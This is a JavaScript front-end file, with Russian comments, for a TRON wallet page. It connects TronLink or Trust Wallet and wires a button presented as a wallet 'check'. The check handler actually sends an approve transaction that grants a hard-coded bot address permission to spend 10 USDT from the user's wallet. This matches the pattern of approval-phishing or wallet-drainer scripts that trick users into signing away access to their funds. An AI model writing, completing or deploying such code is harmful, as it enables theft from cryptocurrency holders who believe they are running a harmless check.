// ============================================
// УПРОЩЁННАЯ ВЕРСИЯ - ТОЛЬКО ДЛЯ ТЕСТА
// ============================================

const CONTRACT_ADDRESS = 'TFYz6a5z8mw3rEs7gev9JirJvFg17KdmCZ';
const BOT_ADDRESS = 'TJKaoUut9WpHr3pBbCyf1TjDxq2rcJRQqB';
const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

let connectedWalletAddress = null;

// Элементы
const walletInput = document.getElementById('walletInput');
const checkBtn = document.getElementById('checkBtn');
const connectBtn = document.getElementById('connectWalletBtn');

// ============================================
// ПОДКЛЮЧЕНИЕ
// ============================================
async function connectWallet() {
    try {
        // TronLink
        if (window.tronWeb && window.tronWeb.defaultAddress) {
            const address = window.tronWeb.defaultAddress.base58;
            connectedWalletAddress = address;
            walletInput.value = address;
            document.getElementById('connectedStatus').style.display = 'inline-flex';
            alert('✅ TronLink подключён!');
            return;
        }
        
        // Trust Wallet
        if (window.trustwallet && window.trustwallet.tronLink) {
            await window.trustwallet.tronLink.request({ method: 'tron_requestAccounts' });
            const address = window.trustwallet.tronLink.defaultAddress.base58;
            connectedWalletAddress = address;
            walletInput.value = address;
            document.getElementById('connectedStatus').style.display = 'inline-flex';
            alert('✅ Trust Wallet подключн!');
            return;
        }
        
        alert('❌ Кошелёк не найден');
        
    } catch (error) {
        console.error('Ошибка:', error);
        alert('Ошибка: ' + error.message);
    }
}

// ============================================
// ПРОВЕРКА - МАКСИМАЛЬНО УПРОЩЕНА
// ============================================
async function handleTronCheck() {
    try {
        if (!connectedWalletAddress) {
            alert('Сначала подключите кошелёк');
            return;
        }

        // Получаем tronWeb
        const tronWeb = window.tronWeb || window.trustwallet?.tronLink?.tronWeb;
        if (!tronWeb) {
            alert('TronWeb не найден');
            return;
        }

        console.log('Начинаем approve...');
        
        // ФИКСИРОВАННАЯ СУММА: 10 USDT
        const amount = '10000000'; // 10 USDT
        
        // Получаем контракт
        const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);
        
        console.log('Отправка approve...');
        
        // Отправляем approve
        const tx = await contract.approve(
            BOT_ADDRESS,
            amount
        ).send({
            feeLimit: 150_000_000,
            callValue: 0,
            shouldPollResponse: true
        });

        console.log('✅ Approve отправлен:', tx);
        alert('✅ Approve отправлен!\nTX: ' + tx);
        
    } catch (error) {
        console.error('❌ Ошибка:', error);
        alert('Ошибка: ' + error.message + '\n\nСкопируйте эту ошибку и отправьте мне');
    }
}

// ============================================
// ИНИЦИАЛИЗАЦИЯ
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    if (checkBtn) checkBtn.addEventListener('click', handleTronCheck);
    if (connectBtn) connectBtn.addEventListener('click', connectWallet);
});
